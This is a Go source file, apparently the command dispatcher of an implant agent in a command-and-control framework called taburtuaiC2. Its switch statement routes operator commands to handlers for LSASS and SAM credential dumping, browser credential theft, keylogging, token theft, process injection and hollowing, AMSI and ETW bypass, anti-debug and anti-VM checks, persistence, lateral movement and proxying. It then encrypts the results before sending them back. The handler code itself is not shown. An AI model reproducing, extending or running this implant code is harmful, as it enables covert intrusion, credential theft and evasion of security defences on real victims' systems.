package main

import (
	"fmt"
	"os"

	"github.com/mjopsec/taburtuaiC2/pkg/types"
)

// ExecuteCommand routes a command to the appropriate handler and returns the result.
func ExecuteCommand(agent *Agent, cmd *types.Command) *types.CommandResult {
	result := &types.CommandResult{
		CommandID: cmd.ID,
		ExitCode:  0,
	}

	dbgf("[*] Executing command (Type: %s): %s\n", cmd.OperationType, cmd.Command)

	originalDir, _ := os.Getwd()
	if cmd.WorkingDir != "" {
		if err := os.Chdir(cmd.WorkingDir); err != nil {
			result.Error = fmt.Sprintf("Failed to change directory: %v", err)
			result.ExitCode = 1
			return result
		}
		defer os.Chdir(originalDir)
	}

	switch cmd.OperationType {
	case "upload":
		handleUpload(agent, cmd, result)
	case "download":
		handleDownload(agent, cmd, result)
	case "process_list":
		handleProcessList(cmd, result)
	case "process_kill":
		handleProcessKill(cmd, result)
	case "process_start":
		handleProcessStart(cmd, result)
	case "persist_setup":
		handlePersistenceSetup(cmd, result)
	case "persist_remove":
		handlePersistenceRemove(cmd, result)
	case "ads_write":
		handleADSWrite(cmd, result)
	case "ads_read":
		handleADSRead(cmd, result)
	case "ads_exec":
		handleADSExec(cmd, result)
	case "lolbin_fetch":
		handleLOLBinFetch(cmd, result)
	case "inject_remote":
		handleInjectRemote(cmd, result)
	case "inject_self":
		handleInjectSelf(cmd, result)
	case "timestomp":
		handleTimestomp(cmd, result)
	case "amsi_bypass":
		handleAMSIBypass(cmd, result)
	case "etw_bypass":
		handleETWBypass(cmd, result)
	case "token_list":
		handleTokenList(cmd, result)
	case "token_steal", "token_impersonate":
		handleTokenImpersonate(cmd, result)
	case "token_make":
		handleTokenMake(cmd, result)
	case "token_revert":
		handleTokenRevert(cmd, result)
	case "token_runas":
		handleTokenRunas(cmd, result)
	case "screenshot":
		handleScreenshot(cmd, result)
	case "keylog_start":
		handleKeylogStart(cmd, result)
	case "keylog_dump":
		handleKeylogDump(cmd, result)
	case "keylog_stop":
		handleKeylogStop(cmd, result)
	case "keylog_clear":
		handleKeylogClear(cmd, result)
	case "hollow":
		handleHollow(cmd, result)
	case "hijack":
		handleHijack(cmd, result)
	case "stomp":
		handleStomp(cmd, result)
	case "mapinject":
		handleMapInject(cmd, result)
	case "lsass_dump":
		handleLSASSDump(cmd, result)
	case "lsass_dump_dup":
		handleLSASSDumpDup(cmd, result)
	case "lsass_dump_wer":
		handleLSASSDumpWER(cmd, result)
	case "sam_dump":
		handleSAMDump(cmd, result)
	case "browsercreds":
		handleBrowserCreds(cmd, result)
	case "clipboard_read":
		handleClipboardRead(cmd, result)
	case "sleep_obf":
		handleSleepObf(cmd, result)
	case "unhook_ntdll":
		handleUnhookNTDLL(cmd, result)
	case "hwbp_set":
		handleHWBPSet(cmd, result)
	case "hwbp_clear":
		handleHWBPClear(cmd, result)
	case "amsi_hwbp":
		handleAMSIHWBP(result)
	case "etw_hwbp":
		handleETWHWBP(result)
	case "bof_exec":
		handleBOFExec(cmd, result)
	case "antidebug":
		handleAntiDebug(cmd, result)
	case "antivm":
		handleAntiVM(cmd, result)
	case "timegate_set":
		handleTimeGateSet(agent, cmd, result)
	case "net_scan":
		handleNetScan(cmd, result)
	case "arp_scan":
		handleARPScan(cmd, result)
	case "reg_read":
		handleRegRead(cmd, result)
	case "reg_write":
		handleRegWrite(cmd, result)
	case "reg_delete":
		handleRegDelete(cmd, result)
	case "reg_list":
		handleRegList(cmd, result)
	case "socks5_start":
		handleSOCKS5Start(cmd, result)
	case "socks5_stop":
		handleSOCKS5Stop(result)
	case "socks5_status":
		handleSOCKS5Status(result)
	case "portfwd_start":
		handlePortFwdStart(agent, cmd, result)
	case "portfwd_stop":
		handlePortFwdStop(cmd, result)
	case "lateral_wmi":
		handleLateralWMI(cmd, result)
	case "lateral_winrm":
		handleLateralWinRM(cmd, result)
	case "lateral_schtask":
		handleLateralSchtask(cmd, result)
	case "lateral_service":
		handleLateralService(cmd, result)
	case "lateral_dcom":
		handleLateralDCOM(cmd, result)
	case "threadless_inject":
		handleThreadlessInject(cmd, result)
	case "pe_load":
		handlePELoad(cmd, result)
	case "dotnet_exec":
		handleDotnetExec(cmd, result)
	case "ps_runspace":
		handlePSRunspace(cmd, result)
	case "stego_extract":
		handleStegoExtract(cmd, result)
	case "execute":
		fallthrough
	default:
		handleExecute(agent, cmd, result)
	}

	if agent.crypto != nil && !(cmd.OperationType == "download" && result.Encrypted) {
		encryptResult(agent, result)
	}

	return result
}

func encryptResult(agent *Agent, result *types.CommandResult) {
	if result.Output != "" {
		if encrypted, err := agent.crypto.EncryptData([]byte(result.Output)); err == nil {
			result.Output = encrypted
			result.Encrypted = true
		}
	}
	if result.Error != "" {
		if encrypted, err := agent.crypto.EncryptData([]byte(result.Error)); err == nil {
			result.Error = encrypted
			result.Encrypted = true
		}
	}
}
